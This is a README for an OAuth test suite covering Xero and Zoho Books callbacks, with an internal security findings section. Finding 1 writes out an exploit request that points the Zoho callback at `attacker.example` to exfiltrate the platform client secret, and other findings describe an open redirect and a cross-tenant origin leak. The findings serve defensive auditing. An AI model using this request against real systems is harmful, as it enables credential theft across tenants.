# `integrations/accounting` — Xero and Zoho Books

## Why one folder for two providers

> "Zoho–Xero toh ek hi hai na takreeban, woh cases toh **EK HI BANENGE**."

They are close enough that the cases are written **once** and driven over a
provider table (`helpers/accounting-source.ts` → `PROVIDERS`). Adding a case in
`oauth-start.test.ts` or `oauth-callback-state.test.ts` adds it for both.

They are **not** the same function, and a table-driven suite has one
characteristic failure: it quietly asserts the *intersection* of two things and
reads as twice the coverage. So every real difference is declared on the
provider spec and asserted in its own file, `provider-asymmetry.test.ts`:

| | Xero | Zoho Books |
|---|---|---|
| data centres | one (`login.xero.com`) | six, and the operator picks |
| scope separator | space | comma |
| scope encoding | hand-built, RFC 3986 `%20` | `URLSearchParams` |
| refresh token requested via | the `offline_access` **scope** | `access_type` + `prompt` **params** |
| token endpoint | a constant | derived at callback time |
| failure reporting | HTTP status codes | HTTP 200 with an error in the body |
| `expires_in` missing | throws | falls back to 3600s |

That table is the reason this folder is not two folders and is also not one file.

## The four functions

```
supabase/functions/xero-oauth-start/      authenticated. Writes one nonce row.
supabase/functions/zoho-oauth-start/      Same, plus a region.
supabase/functions/xero-oauth-callback/   verify_jwt = false. The redirect target.
supabase/functions/zoho-oauth-callback/   Same, plus data-centre resolution.
```

## The case that matters most

`state` is the **only** authentication the callbacks have. They run with
`verify_jwt = false` — Xero and Zoho redirect a browser back to us with no
session token — so everything that follows is authorised by one nonce in
`accounting_oauth_state`: redeeming the authorization code, storing OAuth
tokens against a tenant, flipping that tenant's integration flag, and
back-filling every financial event that was recorded while it was disconnected.

Five refusals were asked for. **All five are currently guarded**, and here is
where each one is proven:

| case | guarded? | where it is proven |
|---|---|---|
| missing `state` | yes — `missing_params` | L1 source + L2 live |
| `state` not in the table | yes — `invalid_state` | L1 source + L2 live |
| `state` already consumed | yes, **by deletion** — see below | L1 source only |
| `state` expired | yes — `state_expired`, 30-min TTL | L1 source only |
| a provider `error` param | yes — passed through as `status=error` | L1 source + L2 live |
| `state` minted for the *other* provider | yes — `state_provider_mismatch` | L1 source only |

**"Already consumed" is not a separate branch.** A redeemed nonce is `DELETE`d
(there is no `used_at` column), so a second attempt lands on the unknown-nonce
guard and gets `invalid_state`. That is a legitimate design — and it means the
delete *is* the single-use guarantee, which is why two cases assert it exists,
is keyed by the state received, and runs *after* the tokens are stored. See
finding 5 for the part of it that is not airtight.

The three that are **L1-only** are honest about it: driving a real expired or
mismatched nonce needs a seeded row, which needs service-role credentials.
Layer 2 deliberately holds none — it is a caller, like the browser is
(`tests/README.md` §6) — and mocking the Supabase client would test a mock.

## Order, not just existence

Half the assertions here are about **order**, for the same reason the Stripe
refund test's are. The irreversible step on this surface is redeeming the
one-time authorization code: once it is spent the operator has to walk the whole
consent round-trip again, and a state check that runs afterwards has already
sent our `client_id` and `client_secret` somewhere. So:

- every state guard sits **above** the token exchange, and above
  `accounting_store_tokens`;
- every auth, role and config check in the start functions sits **above** the
  `accounting_oauth_state` insert — a nonce written before the caller is cleared
  is a nonce an unauthorised caller created, and the callback trusts any nonce
  it finds;
- the nonce delete sits **below** the token store — deleting first would leave a
  failed store with nothing to retry.

## What is here

```
accounting/
  README.md                      this file
  helpers/
    accounting-source.ts         the contract reader (see below), PROVIDERS,
                                 the drift message, and the order helpers
    accounting-live.ts           GET + no-redirect-following on top of
                                 liveStatus(); the write gate
    token-expiry.ts              the pure arithmetic the maths file mirrors
  oauth-start.test.ts            contract, authorisation, order, the authorize URL
  oauth-callback-state.test.ts   THE STATE GUARD, single use, no token in a log
  provider-asymmetry.test.ts     where the two must not be made to look alike
  token-expiry.maths.test.ts     L3
```

```
88 passed | 15 skipped     no env, no network, ~0.7s
```

The "no network" claim is checked, not assumed — the same run passes unchanged
inside an empty network namespace:

```
$ unshare -rn npx vitest run --config tests/vitest.config.ts integrations/accounting
 Test Files  4 passed (4)
      Tests  88 passed | 15 skipped (103)
```

## Why this folder has its own contract reader

`tests/helpers/edge-contract.ts` **throws on all four of these functions**.
Verified, not assumed — `readEdgeFunction` reports "could not find where the
request body is parsed" for every one. Two distinct reasons:

1. **The start functions never annotate the body variable.** They write
   `const body = (await req.json().catch(() => ({}))) as Payload` — an `as`
   cast, which is neither of the annotated shapes nor a destructure. Worse, both
   of them read `tenantSlug` through an *inline* cast,
   `(body as { tenantSlug?: string }).tenantSlug`, and that field is absent from
   the `Payload` interface entirely. A parser reading only the declared type
   would call the portal's payload "extra" and push a developer to delete the
   one field that carries cross-tenant intent.

2. **The callbacks have no body at all.** They are the provider's redirect
   target: a browser GET with `code`, `state` and `error` in the **query
   string**. `req.json()` is never called, so a body parser has nothing to find
   and the phrase "payload contract" does not apply. Their contract is the query
   string, and that is what `helpers/accounting-source.ts` derives instead.

The shared helper is shared, so it was not edited. The local reader follows its
rule exactly: an unrecognised shape **throws** rather than returning an empty
field set, because a silent zero makes every assertion in this folder pass for
the wrong reason.

## The maths (Layer 3)

There is exactly one piece of real arithmetic in these four functions, and it is
not decorative:

```
token_expires_at = now + (expires_in - 30) * 1000
```

`refresh-accounting-tokens` reads that timestamp to decide when to refresh, so
this one line decides whether every tenant's sync keeps working or 401s on a
schedule. Three independent ways to be wrong, each with a different cost — the
sign of the skew, the seconds→milliseconds unit, and a missing `expires_in` —
and each has its own case. The helper's constants are read back **out of the
functions' own source**, so the mirror cannot drift from the thing it mirrors.

**Invoice totals, tax and currency conversion are not on this surface.** See
finding 6: they are downstream, they are a real maths surface, and they belong
in a suite of their own.

## Layer 2 — what runs live, and what it costs

Two rungs here, not three. The Stripe folder needs
`D247_LIVE_ALLOW_MONEY_MOVEMENT` because `refunds.create` moves money at a third
party with no undo. **Nothing in these four functions can move a penny** — the
irreversible thing here is a consent grant, not a balance — so this folder says
so rather than importing a money gate to look rigorous. Inventing a gate for a
surface that cannot move money teaches the next reader that the gates are
decoration.

| case | needs | what it costs |
|---|---|---|
| callback: a provider `error` is reported as an error | `D247_LIVE_TESTS=1` | nothing |
| callback: no state (both directions) | `D247_LIVE_TESTS=1` | nothing |
| callback: an unknown state is refused | `D247_LIVE_TESTS=1` | one `SELECT` that misses |
| callback: a POST is 405'd | `D247_LIVE_TESTS=1` | nothing |
| start: an unauthenticated caller is 401'd | `D247_LIVE_TESTS=1` + `D247_LIVE_ANON_KEY` | nothing |
| start: a GET is 405'd | `D247_LIVE_TESTS=1` + `D247_LIVE_ANON_KEY` | nothing |
| start: Zoho refuses an unknown data centre | `D247_LIVE_TESTS=1` + `D247_LIVE_ANON_KEY` | nothing |
| start: an admin gets an authorize URL | **`D247_LIVE_ALLOW_WRITES=1`** + `D247_LIVE_PORTAL_JWT` | **two `accounting_oauth_state` rows** |

The callback cases send **no credentials at all** — no `Authorization`, no
`apikey` — because that is exactly what a provider's redirect looks like, and
these endpoints are `verify_jwt = false`. None carries a real nonce, and without
one the function answers from its state guards before it reads or writes
anything. That is not an assumption; it is the Layer 1 order case, which is what
makes them safe to run on the read-only rung.

**A real nonce must never be used in these tests.** Anything holding one can
drive the callback for real — which is the entire point of finding 1.

`D247_LIVE_PORTAL_JWT` is the same variable the Stripe folder uses and is *not*
`D247_LIVE_SESSION_JWT`: the start functions look the caller up in `app_users`
and refuse anyone who is not admin, head_admin or a super admin, so a
signup-era token would only ever prove the 403 path.

Production is refused by `helpers/live-call.ts`, inherited rather than
re-implemented — there is deliberately no env var read in
`helpers/accounting-live.ts` that could widen, declare or excuse a target.
Exercised in both directions, inside an empty network namespace so nothing could
have been sent even if it had not thrown: no target set, the production ref,
`ALLOW_WRITES` with Layer 2 off, and `ALLOW_WRITES` with no fixture (that last
one skips, as it should).

Nobody has run Layer 2 against the branch clone yet — there are no keys for that
project in this repo — so there is no "expected" live tally to quote, and
inventing one would be worse than leaving the gap.

---

# FINDINGS

Real defects found while writing these tests. **No test in this folder asserts
any of the behaviour below is correct.** Where a finding has a safe counterpart
on the other provider, the counterpart is asserted (Xero's constant token
endpoint, Zoho's `expires_in` guard) — so the day the defect is fixed, the two
sides agree and nothing here needs deleting.

### 1. HIGH — `zoho-oauth-callback` POSTs the platform Zoho client secret to a host named in the request

`supabase/functions/zoho-oauth-callback/index.ts:84,105-124`

```ts
const accountsServer = url.searchParams.get("accounts-server");   // line 84
...
const form = new URLSearchParams({
  grant_type: "authorization_code", code,
  client_id: clientId, client_secret: clientSecret, redirect_uri: redirectUri,
});
const tokenEndpoint = accountsServer
  ? `${accountsServer.replace(/\/+$/, "")}/oauth/v2/token`        // line 116
  : ZOHO.tokenUrl(region);
const tokenRes = await fetch(tokenEndpoint, { method: "POST", ..., body: form.toString() });
```

`accounts-server` is an **unvalidated absolute URL taken straight from the query
string**, and the request sent to it carries `ZOHO_CLIENT_SECRET`.

The hostname *is* parsed one line above — `regionFromAccountsServer()` requires
`accounts.zoho.<suffix>` or `accounts.zohocloud.ca` — but its result gates only
the `region` variable. The `fetch` uses the raw value.

**Precondition: one valid, unexpired `zoho` nonce.** That is not a high bar. Any
`admin` or `head_admin` of any tenant clicks "Connect Zoho Books" and is handed
one in their own browser — it is the `state=` in the `authorizeUrl` the start
function returns. They simply do not follow it, and instead request:

```
GET /functions/v1/zoho-oauth-callback
      ?code=x&state=<their own nonce>&accounts-server=https://attacker.example
```

No authentication is needed on that request; the callback is
`verify_jwt = false`. The nonce passes every guard — it exists, its provider is
`zoho`, it has not expired — and the function then POSTs `client_id` and
`client_secret` to `attacker.example`.

**Impact:** the platform's Zoho OAuth application credentials, which are shared
by every tenant, exfiltrated to an attacker-chosen host. Escalation from
single-tenant admin to platform-wide.

**Contrast:** `xero-oauth-callback` redeems at the constant `XERO.tokenUrl` and
has no equivalent. `provider-asymmetry.test.ts` asserts that constant precisely
so the same class of problem is caught if it ever arrives on the Xero side.

**Fix (one line, already written next door):** redeem at a host derived from the
*validated* region — `regionFromAccountsServer()`'s output is computed
immediately above and discarded for this purpose — or allowlist the
`accounts-server` host before using it. Note the reason the raw URL was
preferred is real (Canada is `zohocloud.ca`, outside the `zoho.<suffix>`
template), so the fix is an allowlist rather than deleting the branch.

### 2. MEDIUM — one tenant's portal origin leaks into another tenant's redirect

`xero-oauth-callback/index.ts:211,214-221,236-252` · `zoho-oauth-callback/index.ts:337,340-347,362-378`

```ts
let requestPortalBase: string | null = null;        // MODULE scope
function rememberPortalBase(redirectBack) { requestPortalBase = new URL(redirectBack).origin; }
```

Its own JSDoc says *"Remembered for the lifetime of this request"*. It is not —
it is module state in a Deno isolate, and Supabase's edge runtime reuses isolates
across requests. It is set inside the handler and never reset.

Three consequences:

- The early returns that run **before** `rememberPortalBase` — the provider
  `error` branch, `missing_params`, `invalid_state` — redirect to whatever origin
  the *previous* request in that isolate left behind. Operator B's failed connect
  attempt 302s them to operator A's portal.
- The stale value takes **priority** over the configured fallback
  (`requestPortalBase ?? Deno.env.get("PORTAL_BASE_URL")`), so a correctly
  configured deployment does not escape it.
- Because the callback is `verify_jwt = false`, an unauthenticated caller can
  send `?error=x` and read the `Location` header to learn which tenant most
  recently connected accounting on that isolate.

This is also why `helpers/accounting-live.ts` reads the verdict out of *either*
response shape: which one a request gets is not a property of that request.

**Fix:** pass the base as an argument, or reset it on the first line of the
handler.

### 3. MEDIUM — `redirect_back` is never validated, on either side

`*-oauth-start` stores `body.redirectBack` verbatim; `*-oauth-callback` 302s to
it verbatim (`xero:187-189`, `zoho:283-285`), and finding 2's
`rememberPortalBase` derives every *error* redirect's origin from it as well.

The only mitigation is client-side, and the portal knows it —
`apps/portal/.../xero-data.ts:437-441`:

> "`redirectBack` IS ours, and it is the one value here that could be abused:
> the callback 302s the browser to it verbatim on success … never from a query
> parameter, a prop or anything else a link could carry, which would turn the
> callback into an open redirect."

Any other caller bypasses that comment — an admin's own
`supabase.functions.invoke` will do. `_shared/resolve-tenant.ts` already carries
`ALLOWED_HOST_SUFFIXES` for exactly this shape of value, but only consults it to
*derive a slug for super admins*; it never rejects a bad `redirectBack`.

**Impact:** an authenticated-admin-seeded open redirect from a `*.supabase.co`
origin. Phishing-grade, not credential-grade — the authorization code is already
spent by the time the redirect is emitted.

**Fix:** validate `redirectBack` against `ALLOWED_HOST_SUFFIXES` in the start
function, before persisting it.

### 4. LOW — `xero-oauth-callback` throws on a missing `expires_in`, after the code is spent

`xero-oauth-callback/index.ts:99`

```ts
const expiresAt = new Date(Date.now() + (tokenJson.expires_in - 30) * 1000).toISOString();
```

No guard. `undefined - 30` is `NaN`, and `new Date(NaN).toISOString()` throws
`RangeError: Invalid time value`. That throw lands in the outer catch **after**
the authorization code has been redeemed: the grant is spent, the tokens are in
a local variable about to be discarded, and the operator is redirected to
`reason=Invalid time value`.

`zoho-oauth-callback:164-167` has exactly the guard that is missing, added
deliberately with a comment naming this failure. Xero does send `expires_in`
today, so this is defensive — reported because the fix is one line and is
already written in the file next door. `token-expiry.maths.test.ts` asserts the
asymmetry as arithmetic, and its message says what to do when it is fixed.

### 5. LOW — the nonce delete is unchecked, and only happens on the success path

```ts
await supabase.from("accounting_oauth_state").delete().eq("nonce", state);
```

Two things:

- The `{ error }` is discarded. `supabase-js` never throws, so a failed delete
  leaves the nonce live for the rest of its 30-minute TTL with nothing reporting
  it anywhere.
- Every failure path between the state lookup and the delete — token exchange
  failed, organisations lookup failed, persist failed, no refresh token — returns
  **without** consuming the nonce.

Residual risk on its own is low: an authorization code is single-use, so a
replay needs a fresh code. It matters because it is precisely the precondition
finding 1 needs, and because "consumed" has no representation other than the
row's absence. A `used_at` column, or checking the delete's error, closes both.

### 6. INFORMATIONAL — the accounting *maths* is downstream, not in these four functions

The brief asked for a maths suite here only if the sync path has real
arithmetic. It does, and it is not here:

- `process-accounting-sync/index.ts` carries money as **integer cents** end to
  end (`amount_cents`, `tax_cents`); its only arithmetic is `Math.abs()` for
  credit notes (`:333,340`).
- The conversion to major units happens at the provider boundary —
  `_shared/accounting/xero-client.ts:239,296,346` and
  `zoho-client.ts:217,221,316`, four `/ 100` call sites each.
- **Tax is not computed by us.** Xero is sent `LineAmountTypes: "Exclusive"` and
  works the tax line out itself; Zoho is sent a per-org `tax_id`. So a "tax
  maths" suite here would be testing nothing we own.

That is a real maths surface in the same category as the Bonzah tests, and it
belongs to whoever owns `process-accounting-sync`. It is named here rather than
half-covered.

## Adding a case

- **A new field in a start payload** — add it to that provider's `startPayload`
  in `helpers/accounting-source.ts`. If the function does not read it, the test
  says so by name and by origin.
- **A new query parameter on a callback** — add it to that provider's
  `extraCallbackParams`. The contract case asserts the set exactly, in both
  directions, so an unlisted one fails and a listed-but-removed one fails too.
- **A case that is true of both providers** — put it in `oauth-start.test.ts` or
  `oauth-callback-state.test.ts`, inside a `describe.each(PROVIDERS)`.
- **A case that is true of one** — it belongs in `provider-asymmetry.test.ts`,
  with a sentence saying what breaks if the two are made to look alike.
- **A function shape the local parser does not know** — teach
  `helpers/accounting-source.ts`. It throws rather than returning zero fields,
  for the same reason the shared helper does.
